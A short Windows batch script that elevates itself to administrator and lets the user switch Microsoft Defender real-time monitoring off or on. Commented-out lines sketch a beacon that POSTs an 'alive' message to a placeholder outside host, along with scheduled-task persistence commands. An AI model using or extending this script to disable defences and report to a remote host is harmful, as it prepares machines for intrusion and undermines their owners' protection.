@echo off
echo.
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
echo.
echo Working as admin...
echo.
echo press [1] if you want to disable defender
echo or
echo press [2] if you want to enable defender
rem powershell -Command "Invoke-WebRequest -Uri http://<ip:port> -Method POST -Body 'alive=%name%'"
rem schtask /create /sc DAILY /tn "taskname" /tr "path" /st time
rem schtask /delete /tn "taskname" /f
set /p choice=Press your choice : 
if "%choice%"=="1" (
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 
    echo defender disabled!
) else (
 if "%choice%"=="2" (
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
    echo defender enabled!
)  else (
    echo invalid choice
)
)
pause